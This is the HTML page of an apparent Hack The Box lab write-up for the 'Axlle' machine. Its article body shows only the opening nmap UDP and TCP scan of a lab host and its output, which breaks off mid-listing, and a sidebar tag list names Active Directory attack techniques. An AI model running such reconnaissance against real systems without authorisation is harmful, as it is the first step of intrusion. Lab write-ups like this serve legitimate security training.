<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="desktop" > 
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-84TPQBH5EH"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-84TPQBH5EH');
</script>
<!-- End Google Analytics -->

  
  

  
  <title>【season-5】 htb Axlle wp | ❀言わぬが花❀</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">

  <meta name="description" content="Usernmap1234567891011121314151617181920212223242526272829303132333435363738└─$ sudo nmap -sU 10.129.29.242 --top-ports&#x3D;200 --min-rate&#x3D;3000Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-06-22 22:08">
<meta property="og:type" content="article">
<meta property="og:title" content="【season-5】 htb Axlle wp">
<meta property="og:url" content="http://example.com/2024/06/24/box-Axlle-wp/index.html">
<meta property="og:site_name" content="❀言わぬが花❀">
<meta property="og:description" content="Usernmap1234567891011121314151617181920212223242526272829303132333435363738└─$ sudo nmap -sU 10.129.29.242 --top-ports&#x3D;200 --min-rate&#x3D;3000Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-06-22 22:08">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/wpimages/2024/Axlle/background.jpg">
<meta property="article:published_time" content="2024-06-24T05:37:21.000Z">
<meta property="article:modified_time" content="2024-08-23T08:39:29.818Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/wpimages/2024/Axlle/background.jpg">
  
    <link rel="alternate" href="/atom.xml" title="❀言わぬが花❀" type="application/atom+xml">
  
  
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 7.1.1"></head>

<body>
  
  
    
<div id="banner" class="">
  <img src="/images/backgroup.jpg" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="  ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>❀言わぬが花❀ </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
    </a>
    
      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
      </a>
    
    <div id="nav-menu-btn" class="nav-icon">
      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
    
      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=/images/avatar.jpg></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">Flower </div>
      <div class="dot"></div>
      <div class="subtitle">Hi Im Flower </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://store.steampowered.com" title="Steam"><i class="fa-brands fa-steam"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com" title="GitHub"><i class="fa-brands fa-github"></i></a>
         
      </div>  
    </div>
  </div>
</div>

  
    
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Tags</h3>
      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AD/" rel="tag">AD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AS-REQ-ST/" rel="tag">AS-REQ ST</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AllowedtoAct/" rel="tag">AllowedtoAct</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/C/" rel="tag">C#</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/C/" rel="tag">C++</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2024-36467/" rel="tag">CVE-2024-36467</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2024-42327/" rel="tag">CVE-2024-42327</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/DACL/" rel="tag">DACL</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/DLL/" rel="tag">DLL</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ESC1/" rel="tag">ESC1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ESC4/" rel="tag">ESC4</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ForceChangePassword/" rel="tag">ForceChangePassword</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Forensic/" rel="tag">Forensic</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GMSA/" rel="tag">GMSA</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GenericAll/" rel="tag">GenericAll</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Jenkins/" rel="tag">Jenkins</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/NTHASH/" rel="tag">NTHASH</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Nmap/" rel="tag">Nmap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PKINIT/" rel="tag">PKINIT</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PSReadLine/" rel="tag">PSReadLine</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PasstheCert/" rel="tag">PasstheCert</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Rubeus/" rel="tag">Rubeus</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SPN/" rel="tag">SPN</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SQL-injection/" rel="tag">SQL injection</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SeBackupPrivilege/" rel="tag">SeBackupPrivilege</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SeImpersonatePrivilege/" rel="tag">SeImpersonatePrivilege</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Server-Operators/" rel="tag">Server Operators</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Tips/" rel="tag">Tips</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/WriteOwner/" rel="tag">WriteOwner</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Zabbix/" rel="tag">Zabbix</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ansible-vault/" rel="tag">ansible_vault</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/asp/" rel="tag">asp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/aws/" rel="tag">aws</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azure-devops/" rel="tag">azure devops</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azureAD/" rel="tag">azureAD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/blockchain/" rel="tag">blockchain</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/browser/" rel="tag">browser</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/brute-rid/" rel="tag">brute-rid</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bypass-kerberos-only/" rel="tag">bypass-kerberos-only</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cd/" rel="tag">cd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cme/" rel="tag">cme</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/consul/" rel="tag">consul</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/deb/" rel="tag">deb</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/defaultapppool/" rel="tag">defaultapppool</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnstools/" rel="tag">dnstools</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dpapi/" rel="tag">dpapi</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/edge/" rel="tag">edge</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/efspotato/" rel="tag">efspotato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/esc1/" rel="tag">esc1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/firewall/" rel="tag">firewall</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fishing/" rel="tag">fishing</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/gamepwn/" rel="tag">gamepwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ghost/" rel="tag">ghost</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/go/" rel="tag">go</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/h2/" rel="tag">h2</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/hardhat/" rel="tag">hardhat</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/havoc/" rel="tag">havoc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/impacket-GetUserSPNs/" rel="tag">impacket-GetUserSPNs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/impacket-smbclient/" rel="tag">impacket-smbclient</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/iptables/" rel="tag">iptables</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/iptables-save/" rel="tag">iptables-save</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/jwt/" rel="tag">jwt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/k8s/" rel="tag">k8s</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/kcd/" rel="tag">kcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/laps/" rel="tag">laps</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ldap/" rel="tag">ldap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ldaps/" rel="tag">ldaps</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/limesurvey/" rel="tag">limesurvey</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/logon-script/" rel="tag">logon script</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mail/" rel="tag">mail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/merge/" rel="tag">merge</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/msDS-KeyCredentialLink/" rel="tag">msDS-KeyCredentialLink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mssql/" rel="tag">mssql</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/nginx/" rel="tag">nginx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/no-preAuth/" rel="tag">no-preAuth</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/nodejs/" rel="tag">nodejs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pfx/" rel="tag">pfx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/poc/" rel="tag">poc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pod/" rel="tag">pod</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pods/" rel="tag">pods</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/powershell/" rel="tag">powershell</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/powerview/" rel="tag">powerview</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pre2k/" rel="tag">pre2k</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/psexec/" rel="tag">psexec</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rbcd/" rel="tag">rbcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/remote-potato/" rel="tag">remote-potato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rootkit/" rel="tag">rootkit</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rosating/" rel="tag">rosating</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/runascs/" rel="tag">runascs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/s3/" rel="tag">s3</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sercerts/" rel="tag">sercerts</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sherlocks/" rel="tag">sherlocks</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sliver-ticketer/" rel="tag">sliver ticketer</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smb/" rel="tag">smb</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smbmap/" rel="tag">smbmap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sqlcmd/" rel="tag">sqlcmd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ssti/" rel="tag">ssti</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/study/" rel="tag">study</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/svn/" rel="tag">svn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/symlink/" rel="tag">symlink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/tgt/" rel="tag">tgt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/username-anarchy/" rel="tag">username-anarchy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/websocket/" rel="tag">websocket</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/winlogon/" rel="tag">winlogon</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ysoserial-net/" rel="tag">ysoserial.net</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/zip/" rel="tag">zip</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E5%AE%9E%E4%BE%8B%E8%AE%B0%E5%BD%95/" rel="tag">实例记录</a></li></ul>
    </div>
  </div>


  
  <div class="sticky">
    
      


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Categories</h3>
      <div class="category-box">
            <a class="category-link" href="/categories/cloud/">
                cloud
                <div class="category-count">7</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-5/">
                htb-Season-5
                <div class="category-count">7</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-6/">
                htb-Season-6
                <div class="category-count">10</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-4/">
                htb-Season-4
                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/categories/ctf/">
                ctf
                <div class="category-count">7</div>
            </a>
        
            <a class="category-link" href="/categories/Sherlocks/">
                Sherlocks
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/categories/AD/">
                AD
                <div class="category-count">10</div>
            </a>
        
            <a class="category-link" href="/categories/CVE/">
                CVE
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/categories/forensic/">
                forensic
                <div class="category-count">2</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-7/">
                htb-Season-7
                <div class="category-count">2</div>
            </a>
        </div>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Recent Posts</h3>
      <ul>
        
          <a class="recent-link" href="/2025/01/23/box-wp-Backfire/" title="【season-7】htb wp Backfire" >
            <div class="recent-link-text">
              【season-7】htb wp Backfire
            </div>
          </a>
        
          <a class="recent-link" href="/2025/01/16/box-wp-EscapeTwo/" title="【season-7】 htb EscapeTwo wp" >
            <div class="recent-link-text">
              【season-7】 htb EscapeTwo wp
            </div>
          </a>
        
          <a class="recent-link" href="/2025/01/15/Tracks-AD-Object/" title="Tracks-AD-Object" >
            <div class="recent-link-text">
              Tracks-AD-Object
            </div>
          </a>
        
          <a class="recent-link" href="/2025/01/09/Tracks-AD-Flight/" title="Tracks-AD-Flight" >
            <div class="recent-link-text">
              Tracks-AD-Flight
            </div>
          </a>
        
          <a class="recent-link" href="/2025/01/06/Tracks-AD-Intelligence/" title="Tracks-AD-Intelligence" >
            <div class="recent-link-text">
              Tracks-AD-Intelligence
            </div>
          </a>
        
      </ul>
    </div>
  </div>

    
  </div>
</sidebar>
    </div>
    <div id="content-body">
       


<article id="post-box-Axlle-wp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
<div class="article-gallery">
  <div class="article-gallery-photos">
    
      <a class="article-gallery-img" rel="gallery_cm4gvs8fo000hzokyhrz76d6i">
        <img src="/wpimages/2024/Axlle/background.jpg" itemprop="image">
      </a>
    
  </div>
</div>

   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        【season-5】 htb Axlle wp
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2024-06-24T05:37:21.000Z" itemprop="datePublished">2024-06-24</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/categories/htb-Season-5/">htb-Season-5</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            13k words 
          </div>
        </div>
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <h1 id="User"><a href="#User" class="headerlink" title="User"></a>User</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">└─$ sudo nmap -sU 10.129.29.242 --top-ports=200 --min-rate=3000</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-22 22:08 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.29.242 (10.129.29.242)</span><br><span class="line">Host is up (0.50s latency).</span><br><span class="line">Not shown: 196 open|filtered udp ports (no-response)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">53/udp  open  domain</span><br><span class="line">88/udp  open  kerberos-sec</span><br><span class="line">123/udp open  ntp</span><br><span class="line">389/udp open  ldap</span><br><span class="line"></span><br><span class="line"><span class="comment">####</span></span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">25/tcp    open  smtp          hMailServer smtpd</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-23 02:09:51Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: axlle.htb0., Site: Default-First-Site-Name) (X)</span><br><span class="line">445/tcp   open  microsoft-ds? (X)</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: axlle.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  